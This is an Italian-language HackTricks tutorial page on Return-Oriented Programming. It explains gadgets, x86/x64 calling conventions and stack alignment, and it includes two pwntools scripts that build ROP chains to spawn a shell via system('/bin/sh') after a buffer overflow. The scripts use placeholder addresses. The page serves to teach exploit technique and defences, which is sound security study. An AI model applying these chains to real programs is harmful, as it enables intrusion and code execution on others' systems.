# ROP - Return Oriented Programing

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Informazioni di Base**

**Return-Oriented Programming (ROP)** √® una tecnica avanzata di exploit utilizzata per aggirare misure di sicurezza come **No-Execute (NX)** o **Data Execution Prevention (DEP)**. Invece di iniettare ed eseguire shellcode, un attaccante sfrutta pezzi di codice gi√† presenti nel binario o nelle librerie caricate, noti come **"gadget"**. Ogni gadget termina tipicamente con un'istruzione `ret` e esegue una piccola operazione, come spostare dati tra registri o eseguire operazioni aritmetiche. Concatenando questi gadget, un attaccante pu√≤ costruire un payload per eseguire operazioni arbitrarie, aggirando efficacemente le protezioni NX/DEP.

### Come Funziona ROP

1. **Dirottamento del Flusso di Controllo**: Innanzitutto, un attaccante deve dirottare il flusso di controllo di un programma, tipicamente sfruttando un buffer overflow per sovrascrivere un indirizzo di ritorno salvato nello stack.
2. **Concatenazione di Gadget**: L'attaccante seleziona attentamente e concatena i gadget per eseguire le azioni desiderate. Ci√≤ potrebbe coinvolgere la configurazione degli argomenti per una chiamata di funzione, la chiamata della funzione (ad esempio, `system("/bin/sh")`), e la gestione di eventuali operazioni di pulizia o aggiuntive.
3. **Esecuzione del Payload**: Quando la funzione vulnerabile ritorna, anzich√© tornare a una posizione legittima, inizia ad eseguire la catena di gadget.

### Strumenti

Tipicamente, i gadget possono essere trovati utilizzando [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget), [**ropper**](https://github.com/sashs/Ropper) o direttamente da **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## Catena ROP in Esempio x86

### **Convenzioni di Chiamata x86 (32-bit)**

* **cdecl**: Il chiamante pulisce lo stack. Gli argomenti della funzione vengono spinti nello stack in ordine inverso (da destra a sinistra). **Gli argomenti vengono spinti nello stack da destra a sinistra.**
* **stdcall**: Simile a cdecl, ma √® il chiamato a pulire lo stack.

### **Ricerca di Gadget**

Innanzitutto, supponiamo di aver identificato i gadget necessari all'interno del binario o delle sue librerie caricate. I gadget di nostro interesse sono:

* `pop eax; ret`: Questo gadget estrae il valore in cima allo stack nel registro `EAX` e quindi ritorna, consentendoci di controllare `EAX`.
* `pop ebx; ret`: Simile al precedente, ma per il registro `EBX`, consentendo il controllo su `EBX`.
* `mov [ebx], eax; ret`: Sposta il valore in `EAX` nella posizione di memoria puntata da `EBX` e quindi ritorna. Questo √® spesso chiamato un **gadget write-what-where**.
* Inoltre, abbiamo a disposizione l'indirizzo della funzione `system()`.

### **Catena ROP**

Utilizzando **pwntools**, prepariamo lo stack per l'esecuzione della catena ROP come segue mirando ad eseguire `system('/bin/sh')`, nota come la catena inizia con:

1. Un'istruzione `ret` per scopi di allineamento (opzionale)
2. Indirizzo della funzione `system` (supponendo ASLR disabilitato e libc conosciuta, maggiori informazioni in [**Ret2lib**](ret2lib/))
3. Segnaposto per l'indirizzo di ritorno da `system()`
4. Indirizzo della stringa `"/bin/sh"` (parametro per la funzione system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## Catena ROP nell'esempio x64

### **Convenzioni di chiamata x64 (64-bit)**

* Utilizza la convenzione di chiamata **System V AMD64 ABI** su sistemi simili a Unix, dove i **primi sei argomenti interi o puntatori vengono passati nei registri `RDI`, `RSI`, `RDX`, `RCX`, `R8` e `R9`**. Gli argomenti aggiuntivi vengono passati nello stack. Il valore di ritorno viene inserito in `RAX`.
* La convenzione di chiamata **Windows x64** utilizza `RCX`, `RDX`, `R8` e `R9` per i primi quattro argomenti interi o puntatori, con argomenti aggiuntivi passati nello stack. Il valore di ritorno viene inserito in `RAX`.
* **Registri**: I registri a 64 bit includono `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` e `R8` a `R15`.

#### **Ricerca di Gadget**

Per il nostro scopo, concentriamoci sui gadget che ci permetteranno di impostare il registro **RDI** (per passare la stringa **"/bin/sh"** come argomento a **system()**) e quindi chiamare la funzione **system()**. Supponiamo di aver identificato i seguenti gadget:

* **pop rdi; ret**: Estrae il valore in cima allo stack in **RDI** e poi ritorna. Essenziale per impostare il nostro argomento per **system()**.
* **ret**: Un semplice ritorno, utile per l'allineamento dello stack in alcuni scenari.

E conosciamo l'indirizzo della funzione **system()**.

### **Catena ROP**

Di seguito √® riportato un esempio che utilizza **pwntools** per configurare ed eseguire una catena ROP mirata a eseguire **system('/bin/sh')** su **x64**:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
In questo esempio:

* Utilizziamo il gadget **`pop rdi; ret`** per impostare **`RDI`** all'indirizzo di **`"/bin/sh"`**.
* Saltiamo direttamente a **`system()`** dopo aver impostato **`RDI`**, con l'indirizzo di **system()** nella catena.
* Il gadget **`ret_gadget`** viene utilizzato per l'allineamento se l'ambiente di destinazione lo richiede, il che √® pi√π comune in **x64** per garantire un corretto allineamento dello stack prima di chiamare le funzioni.

### Allineamento dello Stack

**L'ABI x86-64** garantisce che lo **stack sia allineato a 16 byte** quando viene eseguita un'**istruzione di chiamata**. **LIBC**, per ottimizzare le prestazioni, **utilizza istruzioni SSE** (come **movaps**) che richiedono questo allineamento. Se lo stack non √® allineato correttamente (cio√® **RSP** non √® un multiplo di 16), le chiamate a funzioni come **system** falliranno in una **catena ROP**. Per risolvere questo problema, aggiungi semplicemente un **gadget ret** prima di chiamare **system** nella tua catena ROP.

## Differenza principale tra x86 e x64

{% hint style="success" %}
Poich√© **x64 utilizza registri per i primi argomenti**, spesso richiede meno gadget rispetto a x86 per chiamate di funzioni semplici, ma trovare e concatenare i gadget giusti pu√≤ essere pi√π complesso a causa del numero maggiore di registri e dello spazio degli indirizzi pi√π ampio. Il numero maggiore di registri e lo spazio degli indirizzi pi√π ampio nell'architettura **x64** offrono sia opportunit√† che sfide per lo sviluppo di exploit, specialmente nel contesto della Programmazione Orientata al Ritorno (ROP).
{% endhint %}

## Esempio di catena ROP in ARM64

### **Principi di base di ARM64 e convenzioni di chiamata**

Controlla la seguente pagina per questa informazione:

{% content-ref url="../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}



## Protezioni contro ROP

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **&** [**PIE**](../common-binary-protections-and-bypasses/pie/): Queste protezioni rendono pi√π difficile l'uso di ROP poich√© gli indirizzi dei gadget cambiano tra le esecuzioni.
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/): In caso di BOF, √® necessario aggirare lo stack canary per sovrascrivere i puntatori di ritorno per abusare di una catena ROP.
* **Mancanza di Gadget**: Se non ci sono abbastanza gadget, non sar√† possibile generare una catena ROP.

## Tecniche basate su ROP

Nota che ROP √® solo una tecnica per eseguire codice arbitrario. Basandosi su ROP sono state sviluppate molte tecniche Ret2XXX:

* **Ret2lib**: Usa ROP per chiamare funzioni arbitrarie da una libreria caricata con parametri arbitrari (di solito qualcosa come `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Usa ROP per preparare una chiamata a una syscall, ad es. `execve`, e far eseguire comandi arbitrari.

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: Il primo sfrutter√† EBP invece di EIP per controllare il flusso e il secondo √® simile a Ret2lib ma in questo caso il flusso √® controllato principalmente con gli indirizzi EBP (anche se √® necessario controllare anche EIP).

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## Altri Esempi e Riferimenti

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64 bit, Pie e nx abilitato, nessun canary, sovrascrive RIP con un indirizzo `vsyscall` con l'unico scopo di tornare all'indirizzo successivo nello stack che sar√† una sovrascrittura parziale dell'indirizzo per ottenere la parte della funzione che rilascia il flag
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64, senza ASLR, gadget ROP per rendere lo stack eseguibile e saltare al codice shell nello stack

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
